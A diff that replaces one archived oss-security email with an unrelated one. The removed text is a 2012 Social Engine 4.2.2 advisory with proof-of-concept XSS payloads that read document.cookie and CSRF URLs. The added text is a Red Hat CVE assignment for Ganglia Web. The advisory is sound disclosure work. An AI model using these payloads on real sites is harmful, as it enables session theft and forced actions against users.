@@ -1,154 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/05/24/1
-Message-ID: <4FBDD0A6.9080703@secplus.com.br>
-Date: Thu, 24 May 2012 03:09:42 -0300
-From: Tiago Natel de Moura <natel@...plus.com.br>
-CC: full-disclosure <full-disclosure@...ts.grok.org.uk>,  bugtraq <bugtraq@...urityfocus.com>, secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com, moderators@...db.org,  submissions@...ketstormsecurity.org, submit@...ecurity.com,  oss-security@...ts.openwall.com
-Subject: CVE-2012-2216 - Social Engine Multiples Vulnerabilities (XSS and CSRF)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/08/02/1
+Message-ID: <5019C40D.2070605@redhat.com>
+Date: Wed, 01 Aug 2012 18:04:29 -0600
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security@...ts.openwall.com
+CC: Vincent Danen <vdanen@...hat.com>
+Subject: Re: CVE request: Ganglia Web 3.5.1
 Content-Type: text/plain; charset=utf-8
 
-Social Engine 4.2.2 Multiples Vulnerabilities
-Earlier versions are also possibly vulnerable.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-INFORMATION
+On 08/01/2012 03:20 PM, Vincent Danen wrote:
+> Not a lot of details on this one, but could a CVE be assigned to
+> this?
+> 
+> Upstream has released Ganglia Web 3.5.1 [1] which includes a fix
+> for a security flaw going back to 3.1.7 and possibly earlier
+> versions.  This flaw can lead to the arbitrary execution of scripts
+> with the privileges of the web user (apache or nobody), which could
+> possibly lead to other compromises or data exposure.  This flaw has
+> been fixed in upstream 3.5.1.  No further information is currently
+> available regarding the flaw or a patch.
+> 
+> [1] http://ganglia.info/?p=549
+> 
+> Other references:
+> 
+> https://bugzilla.redhat.com/show_bug.cgi?id=845124 
+> https://bugs.gentoo.org/show_bug.cgi?id=428776 
+> https://secunia.com/advisories/50047/
 
-Product: Social Engine 4.2.2
-Remote-Exploit: yes
-Vendor-URL: http://www.socialengine.net/
-Discovered by: Tiago Natel de Moura aka "i4k"
-Discovered at: 10/04/2012
-CVE Notified: 10/04/2012
-CVE Number: CVE-2012-2216
+Please use CVE-2012-3448 for this issue.
 
-OVERVIEW
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 
-Social Engine versions 4.2.2 is vulnerable to XSS and CSRF.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.12 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
 
-INTRODUCTION
-
-SocialEngine is a PHP-based white-label social networking service
-platform, that provides features similar to a social network on a user's
-website. Main features include administration of small-to-mid scale
-social networks, some customization abilities, unencrypted code,
-multilingual capability, and modular plugin/widget compatibility. There
-is a range of templates and add-ons available to extend the basic
-features already included in the SocialEngine core.
-
-VULNERABILITY DESCRIPTION
-
-== Persistent XSS in music upload. ==
-
-CWE-79: http://cwe.mitre.org/data/definitions/79.html
-The software does not neutralize or incorrectly neutralizes
-user-controllable input before it is placed in output that is
-used as a web page that is served to other users.
-
-Proof Of Concept:
-POST http://localhost/index.php/music/create
-
-POST data without form-data enctype:
-title=<script>alert(document.cookie);</script>&description=teste
-&search=1&auth_view=everyone&MAX_FILE_SIZE=8388608&filename=
-&fancyuploadfileids=15
-
-== Persistent XSS in creating events ==
-
-POST
-http://localhost/socialengine/socialengine422_trial/index.php/events/create
-
-POST data without form-data enctype:
-title=teste XSS 3&description=teste XSS 3&starttime[date]=4/9/2012&
-starttime[hour]=1&starttime[minute]=0&starttime[ampm]=AM&endtime[date]=4/12/2012
-&endtime[hour]=1&endtime[minute]=0&endtime[ampm]=AM&host=teste
-&location=<script>alert(document.cookie);</script>&MAX_FILE_SIZE=8388608&
-photo=&category_id=0&search=&search=1&approval=&auth_invite=&auth_invite=1&
-auth_view=everyone&auth_comment=everyone&auth_photo=everyone&submit=
-
-== Reflected XSS in search form of events area. ==
-
-Direct javascript injected:
-POST http://localhost/index.php/widget/index/content_id/644
-
-format=html&subject=event_1&search=';alert(document.cookie);var a = '
-
-Proof of Concept:
-- - Go to URL: /index.php/event/$EVENT_ID
-- - Click on the "Guests"
-- - Click in "Search guests" form
-- - Submit: ';alert(document.cookie); var a = '
-
-You will see your PHPSESSID in the alert.
-
-== Multiples CSRF vulnerabilities ==
-
-CWE-352: http://cwe.mitre.org/data/definitions/352.html
-The web application does not, or can not, sufficiently verify whether
-a well-formed, valid, consistent request was intentionally provided by
-the user who submitted the request.
-
-A CSRF in the plugin "Forum" allows forcing the owner of the event to do
-some
-activities such as:
-
-Close a topic:
-GET /index.php/forums/topic/4/example-topic/close/close/1
-
-Open a topic:
-GET /index.php/forums/topic/4/example-topic/close/close/0
-
-A CSRF in the plugin "Event" allows forcing the owner of the event to do
-some
-activities such as:
-
-Close the event:
-GET /index.php/events/topic/close/close/1/event_id/2/topic_id/2
-
-Open the event:
-GET /index.php/events/topic/close/close/0/event_id/2/topic_id/2
-
-"Watch Topic":
-GET /index.php/events/topic/watch/watch/1/event_id/2/topic_id/2
-
-"Stop Watching Topic":
-GET /index.php/events/topic/watch/watch/0/event_id/2/topic_id/2
-
-A CSRF in the plugin "Classifieds" allows forcing the owner of the event
-to do
-some activities such as:
-
-Open the classified listing:
-GET /index.php/classifieds/close/1/closed/0
-
-Close the classified listing:
-GET /index.php/classifieds/close/1/closed/1
-
-VERSIONS AFFECTED
-
-Tested with version 4.2.2 but earlier versions are possibly vulnerable.
-
-SOLUTION
-
-Upgrade to Social Engine 4.2.4.
-
-NOTES
-
-
-The Common Vulnerabilities and Exposures (CVE) project has assigned the
-name CVE-2012-2216 to this issue. This is a candidate for inclusion in
-the CVE list (http://cve.mitre.org), which standardizes names for
-security problems.
-CREDITS
-
-Tiago Natel de Moura aka "i4k"
-SEC+ Information Security Company - http://www.secplus.com.br/
-BugSec Security Team - http://bugsec.googlecode.com/
-
--- 
-Tiago Natel de Moura
-IT Security Consultant                       
-http://www.linkedin.com/in/tiagonatel
-http://www.secplus.com.br/
-http://github.com/tiago4orion
-http://code.google.com/p/bugsec
-
-
+iQIcBAEBAgAGBQJQGcQNAAoJEBYNRVNeJnmTaEcQANgvhjovtiu/E8wH9kLSle8T
+ImbL8A/0ufd0omQTCngXBNVhB5+xNksAyGC9lqKaYSmARLnlsUVW68ULiRKy1qQJ
+5PB9D4R+5SEjZzqhDLrH3A5GuxMhpbNTOmh/qw9b7FL7Jh+OktQtpdwY7rDuuQpV
+CCfx48I3pjmuuHAKUj7GnCmbWNCPXSTe/lAPWbqTC+9gNw0+IOx9hSZRC+muan4l
+tJILX1JyzRhJsw3DSnEjKVE5XvXlJ+DM62ghVzG0ZrjuUPtqMbxlBJj143t+SztW
+kp/2V9UVFK06nVC+wpEg35OIO3kZqDnPqJUIAIKMGaBkHb0iz1vKGagD5cWsU/zm
+7HauP0EyAHAK8EwCiQBloKRVCY12k2daakbr4PLqpjoqZunFr4fNL6Y+2bW+HwWn
+7deDzHFxcy6yDwaWmzz6QrKnePTnouvlFrXLEJ6pCiY4JcCU6zCNmIW6V45iyKkA
+baYS4fKqh8Nxsk1HhIz6U9Ge0C9sy351z7ZjqFOR6SzNeV8LkbqmrWP0TMHzFNa8
+HT2ie7E8OJnlovFZi/TphZwB3Sg17GKuMpE+GE3MjKpghratt60LB/dqD7TORS5A
+EG8lE0f6LD2Uh4fqR7XtorYQ9t28jVYDvWJ1i7PODecY5ZHooqd1QYad5apd0y9a
+GynX35poNXWsdfrge/Hb
+=gT+M
+-----END PGP SIGNATURE-----
